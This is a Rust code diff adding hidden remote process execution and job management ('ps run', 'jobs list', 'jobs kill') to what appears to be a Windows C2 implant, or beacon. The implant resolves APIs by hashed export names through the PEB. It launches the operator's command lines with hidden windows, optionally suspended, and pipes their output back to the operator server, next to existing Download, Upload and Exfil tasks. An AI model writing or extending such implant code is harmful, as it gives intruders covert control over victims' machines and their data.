@@ -97,6 +97,9 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
         Task::Disks => disks(kernel32, id, results),
         Task::PsList => ps_list(kernel32, id, results),
         Task::PsKill { pid } => ps_kill(kernel32, pid, id, results),
+        Task::PsRun { .. } => ps_run(instance, &task, id, results),
+        Task::JobsList => jobs_list(instance, id, results),
+        Task::JobsKill { job_id } => jobs_kill(instance, job_id, id, results),
         Task::Download { .. } => download_start(instance, &task, id, results),
         Task::Upload { .. } => upload_write(instance, &task, id, results),
         Task::Exfil { action, file_id } => exfil(instance, action, file_id, id, results),
@@ -842,6 +845,36 @@ unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer
 
 /// One active download: the handle stays open across cycles, one chunk
 /// per POST (64 KiB — the cycle body budget, docs/WIRE.md).
+/// Live job (ps run): process handle, pid and the stdout pipe's read
+/// end. The id is the original task id — the operator's jobs kill.
+#[derive(Clone, Copy)]
+pub struct Job {
+    pub id: u32,
+    pub handle: isize,
+    pub pid: u32,
+    pub pipe_read: isize,
+    pub killed: bool,
+}
+
+impl Job {
+    pub const EMPTY: Job = Job {
+        id: 0,
+        handle: 0,
+        pid: 0,
+        pipe_read: 0,
+        killed: false,
+    };
+}
+
+/// Concurrent jobs cap (native keeps a vector; a small fixed array is the
+/// no_std answer — the operator rarely runs more than a few).
+pub const MAX_JOBS: usize = 8;
+
+/// Per-drain stdout cap: keeps one job's output inside the 16 KiB cycle
+/// results queue whatever the program writes (the pipe buffers the rest
+/// for the next cycles; the writer blocks when full, like the native).
+const JOB_DRAIN_CAP: usize = 4096;
+
 pub struct DownloadState {
     pub task_id: u32,
     pub file_id: u32,
@@ -1181,4 +1214,379 @@ unsafe fn error(kernel32: *mut c_void, id: u32, results: &mut Writer) {
         ))()
     };
     let _ = transport::push_error_result(results, id, code);
+}
+
+// --- ps run + jobs (port of the native Commander.cpp CmdPsRun and
+// JobsController.cpp ProcessJobs; MVP without the stored-token path) -------
+
+const H_CREATE_PIPE: u64 = fnv1a64(b"CreatePipe");
+const H_CREATE_PROCESS_A: u64 = fnv1a64(b"CreateProcessA");
+const H_GET_EXIT_CODE_PROCESS: u64 = fnv1a64(b"GetExitCodeProcess");
+const H_PEEK_NAMED_PIPE: u64 = fnv1a64(b"PeekNamedPipe");
+
+/// STARTUPINFOA (x64, 8-byte aligned): cb +0x00, lpReserved +0x08,
+/// lpDesktop +0x10, lpTitle +0x18, dwX..dwFillAttribute +0x20..0x38,
+/// dwFlags +0x3C, wShowWindow +0x40, cbReserved2 +0x42, (pad),
+/// lpReserved2 +0x48, hStdInput +0x50, hStdOutput +0x58, hStdError +0x60;
+/// sizeof = 0x68 (104). PROCESS_INFORMATION: hProcess +0, hThread +8,
+/// dwProcessId +16 — size 24. The iteration-16 bug: the offsets were
+/// computed on a packed layout, the pipe handles landed in dwXSize /
+/// dwYCountChars - the child never wrote to the pipe.
+const SI_A_SIZE: usize = 0x68;
+const SI_A_OFF_FLAGS: usize = 0x3C;
+const SI_A_OFF_SHOW: usize = 0x40;
+const SI_A_OFF_STDOUT: usize = 0x58;
+const SI_A_OFF_STDERR: usize = 0x60;
+const PI_SIZE: usize = 24;
+const PI_OFF_PID: usize = 16;
+const STARTF_USESTDHANDLES: u32 = 0x100;
+const STARTF_USESHOWWINDOW: u32 = 0x1;
+const SW_HIDE: u16 = 0;
+const CREATE_SUSPENDED: u32 = 0x4;
+const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+const STILL_ACTIVE: u32 = 259;
+/// SECURITY_ATTRIBUTES: nLength +0, bInheritHandle +4 (BOOL).
+// SECURITY_ATTRIBUTES (x64): nLength +0x00 (u32), lpSecurityDescriptor
+// +0x08 (u64), bInheritHandle +0x10 (u32) - the write end must be
+// inheritable or the child never gets the pipe.
+const SA_OFF_INHERIT: usize = 0x10;
+
+/// `ps run`: create the (optional) stdout pipe, start the program hidden
+/// with stdio redirection, register the job, reply with the pid.
+///
+/// # Safety
+///
+/// Beacon thread; kernel32 resolved on the instance.
+pub unsafe fn ps_run(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
+    let Task::PsRun {
+        output,
+        prog_state,
+        args_len,
+        args,
+    } = task
+    else {
+        return;
+    };
+    let kernel32 = instance.kernel32;
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+
+    // Command line: NUL-terminated copy (manual loop — the memcpy rule).
+    let mut cmdline = [0u8; transport::PATH_CAP + 1];
+    let n = (*args_len as usize).min(transport::PATH_CAP);
+    let mut ci = 0usize;
+    while ci < n {
+        cmdline[ci] = args[ci];
+        ci += 1;
+    }
+
+    // Stdout pipe (inheritable write end).
+    let mut pipe_read: isize = 0;
+    let mut pipe_write: isize = 0;
+    if *output {
+        let create_pipe = peb::find_export(kernel32, H_CREATE_PIPE);
+        if create_pipe.is_null() {
+            return;
+        }
+        let create_pipe = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*mut isize, *mut isize, *mut u8, u32) -> i32,
+        >(create_pipe as *const core::ffi::c_void);
+        let mut sa = [0u8; 24];
+        sa[..4].copy_from_slice(&24u32.to_le_bytes());
+        sa[SA_OFF_INHERIT..SA_OFF_INHERIT + 4].copy_from_slice(&1i32.to_le_bytes());
+        if create_pipe(&mut pipe_read, &mut pipe_write, sa.as_mut_ptr(), 0) == 0 {
+            return;
+        }
+    }
+
+    let mut si = [0u8; SI_A_SIZE];
+    si[..4].copy_from_slice(&(SI_A_SIZE as u32).to_le_bytes());
+    let flags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si[SI_A_OFF_FLAGS..SI_A_OFF_FLAGS + 4].copy_from_slice(&flags.to_le_bytes());
+    si[SI_A_OFF_SHOW..SI_A_OFF_SHOW + 2].copy_from_slice(&SW_HIDE.to_le_bytes());
+    if *output {
+        si[SI_A_OFF_STDOUT..SI_A_OFF_STDOUT + 8]
+            .copy_from_slice(&(pipe_write as u64).to_le_bytes());
+        si[SI_A_OFF_STDERR..SI_A_OFF_STDERR + 8]
+            .copy_from_slice(&(pipe_write as u64).to_le_bytes());
+    }
+    let mut pi = [0u8; PI_SIZE];
+
+    let create = peb::find_export(kernel32, H_CREATE_PROCESS_A);
+    if create.is_null() {
+        if *output && !close.is_null() {
+            (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(isize) -> i32,
+            >(close as *const core::ffi::c_void))(pipe_read);
+            (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(isize) -> i32,
+            >(close as *const core::ffi::c_void))(pipe_write);
+        }
+        return;
+    }
+    let create = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(
+            *const u8,
+            *mut u8,
+            *const core::ffi::c_void,
+            *const core::ffi::c_void,
+            i32,
+            u32,
+            *const core::ffi::c_void,
+            *const u8,
+            *mut u8,
+            *mut u8,
+        ) -> i32,
+    >(create as *const core::ffi::c_void);
+
+    let creation = CREATE_NO_WINDOW | (*prog_state & CREATE_SUSPENDED);
+    let ok = create(
+        core::ptr::null(),
+        cmdline.as_mut_ptr(),
+        core::ptr::null(),
+        core::ptr::null(),
+        i32::from(*output),
+        creation,
+        core::ptr::null(),
+        core::ptr::null(),
+        si.as_mut_ptr(),
+        pi.as_mut_ptr(),
+    );
+
+    // The write end must close in the parent whatever happens next (the
+    // child owns its inherited copy).
+    if *output && !close.is_null() {
+        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(isize) -> i32>(
+            close as *const core::ffi::c_void,
+        ))(pipe_write);
+    }
+
+    if ok == 0 {
+        // COMMAND_ERROR record: the server renders `Error [code]`.
+        let error = peb::find_export(kernel32, H_GET_LAST_ERROR);
+        let code = if error.is_null() {
+            0
+        } else {
+            (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn() -> i32>(
+                error as *const core::ffi::c_void,
+            ))() as u32
+        };
+        let _ = transport::push_error_result(results, id, code);
+        if *output && !close.is_null() {
+            (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(isize) -> i32,
+            >(close as *const core::ffi::c_void))(pipe_read);
+        }
+        return;
+    }
+
+    let pid = u32::from_le_bytes([
+        pi[PI_OFF_PID],
+        pi[PI_OFF_PID + 1],
+        pi[PI_OFF_PID + 2],
+        pi[PI_OFF_PID + 3],
+    ]);
+    let mut handle_bytes = [0u8; 8];
+    handle_bytes.copy_from_slice(&pi[..8]);
+    let handle = isize::from_le_bytes(handle_bytes);
+
+    // Register the job (drop the oldest slot when full — the operator
+    // rarely runs more than MAX_JOBS at once).
+    if instance.jobs_len >= MAX_JOBS {
+        instance.jobs_len = MAX_JOBS - 1;
+    }
+    instance.jobs[instance.jobs_len] = Job {
+        id,
+        handle,
+        pid,
+        pipe_read: if *output { pipe_read } else { 0 },
+        killed: false,
+    };
+    instance.jobs_len += 1;
+
+    let _ = transport::push_ps_run_result(results, id, pid, *output, &cmdline[..n]);
+}
+
+/// `jobs list`: one line per live job.
+///
+/// # Safety
+///
+/// Beacon thread.
+pub unsafe fn jobs_list(instance: &mut Instance, id: u32, results: &mut Writer) {
+    let _ = transport::push_jobs_list_header(results, id, instance.jobs_len as u32);
+    let mut i = 0usize;
+    while i < instance.jobs_len {
+        let j = instance.jobs[i];
+        let _ = transport::push_jobs_list_entry(results, j.id, transport::JOB_TYPE_PROCESS, j.pid);
+        i += 1;
+    }
+}
+
+/// `jobs kill`: mark the job killed (the drain reaps it next cycle,
+/// exactly like the native).
+///
+/// # Safety
+///
+/// Beacon thread.
+pub unsafe fn jobs_kill(instance: &mut Instance, job_id: u32, id: u32, results: &mut Writer) {
+    let mut found = false;
+    let mut i = 0usize;
+    while i < instance.jobs_len {
+        if instance.jobs[i].id == job_id {
+            instance.jobs[i].killed = true;
+            found = true;
+        }
+        i += 1;
+    }
+    let _ = transport::push_jobs_kill_result(results, id, found, job_id);
+}
+
+/// Per-cycle job drain (port of JobsController::ProcessJobs): read the
+/// pending stdout, detect the exit, emit the COMMAND_JOB records, reap
+/// finished jobs.
+///
+/// # Safety
+///
+/// Beacon thread; kernel32 resolved on the instance.
+pub unsafe fn jobs_tick(instance: &mut Instance, results: &mut Writer) {
+    if instance.jobs_len == 0 {
+        return;
+    }
+    let kernel32 = instance.kernel32;
+    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
+    let terminate = peb::find_export(kernel32, H_TERMINATE_PROCESS);
+    let get_exit_ptr = peb::find_export(kernel32, H_GET_EXIT_CODE_PROCESS);
+    if get_exit_ptr.is_null() {
+        return;
+    }
+    let get_exit: unsafe extern "system" fn(isize, *mut u32) -> i32 =
+        core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(isize, *mut u32) -> i32,
+        >(get_exit_ptr as *const core::ffi::c_void);
+    type PeekFn =
+        unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *mut u32, *mut u8) -> i32;
+    type ReadFn =
+        unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const core::ffi::c_void) -> i32;
+    let peek_ptr = peb::find_export(kernel32, H_PEEK_NAMED_PIPE);
+    let read_ptr = peb::find_export(kernel32, H_READ_FILE);
+    let peek: Option<PeekFn> = if peek_ptr.is_null() {
+        None
+    } else {
+        Some(core::mem::transmute::<*const core::ffi::c_void, PeekFn>(
+            peek_ptr as *const core::ffi::c_void,
+        ))
+    };
+    let read: Option<ReadFn> = if read_ptr.is_null() {
+        None
+    } else {
+        Some(core::mem::transmute::<*const core::ffi::c_void, ReadFn>(
+            read_ptr as *const core::ffi::c_void,
+        ))
+    };
+
+    let mut scratch = [0u8; JOB_DRAIN_CAP];
+    let mut i = 0usize;
+    while i < instance.jobs_len {
+        let job = instance.jobs[i];
+
+        // 1. stdout: peek then read the capped slice.
+        if job.pipe_read != 0 {
+            crate::runtime::debug::log(&*(instance as *const Instance), b"jt: drain\n");
+            if let (Some(peek), Some(read)) = (peek, read) {
+                let mut available: u32 = 0;
+                let peeked = peek(
+                    job.pipe_read,
+                    core::ptr::null_mut(),
+                    0,
+                    core::ptr::null_mut(),
+                    &mut available,
+                    core::ptr::null_mut(),
+                );
+                let mut line = [0u8; 17];
+                line[..11].copy_from_slice(b"jt: peeked ");
+                line[11..15].copy_from_slice(&available.to_le_bytes());
+                line[15] = b'\n';
+                crate::runtime::debug::log(&*(instance as *const Instance), &line[..16]);
+                if peeked != 0 && available > 0 {
+                    crate::runtime::debug::log(&*(instance as *const Instance), b"jt: avail\n");
+                    let want = (available as usize).min(JOB_DRAIN_CAP);
+                    let mut got: u32 = 0;
+                    let readed = read(
+                        job.pipe_read,
+                        scratch.as_mut_ptr(),
+                        want as u32,
+                        &mut got,
+                        core::ptr::null(),
+                    );
+                    if readed != 0 && got > 0 {
+                        crate::runtime::debug::log(&*(instance as *const Instance), b"jt: read\n");
+                        // Atomic record: only when the whole record fits.
+                        let need = 10 + 4 + got as usize + 4;
+                        if results.remaining() >= need {
+                            crate::runtime::debug::log(
+                                &*(instance as *const Instance),
+                                b"jt: push\n",
+                            );
+                            let _ = transport::push_job_output(
+                                results,
+                                job.id,
+                                transport::JOB_TYPE_PROCESS,
+                                transport::JOB_STATE_RUNNING,
+                                &scratch[..got as usize],
+                            );
+                        }
+                    }
+                }
+            }
+        }
+
+        crate::runtime::debug::log(&*(instance as *const Instance), b"jt: exit?\n");
+        // 2. exit detection (a killed job is reaped without waiting).
+        let mut done = job.killed;
+        let mut state = transport::JOB_STATE_KILLED;
+        if !done {
+            let mut code: u32 = 0;
+            if get_exit(job.handle, &mut code) != 0 && code != STILL_ACTIVE {
+                done = true;
+                state = transport::JOB_STATE_FINISHED;
+            }
+        }
+
+        if done {
+            if !terminate.is_null() {
+                (core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize, u32) -> i32,
+                >(terminate as *const core::ffi::c_void))(job.handle, 0);
+            }
+            if !close.is_null() {
+                let close_fn = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize) -> i32,
+                >(close as *const core::ffi::c_void);
+                close_fn(job.handle);
+                if job.pipe_read != 0 {
+                    close_fn(job.pipe_read);
+                }
+            }
+            if results.remaining() >= 10 {
+                let _ =
+                    transport::push_job_end(results, job.id, transport::JOB_TYPE_PROCESS, state);
+            }
+            // Remove: shift the tail left.
+            let mut j = i;
+            while j + 1 < instance.jobs_len {
+                instance.jobs[j] = instance.jobs[j + 1];
+                j += 1;
+            }
+            instance.jobs_len -= 1;
+        } else {
+            i += 1;
+        }
+    }
 }
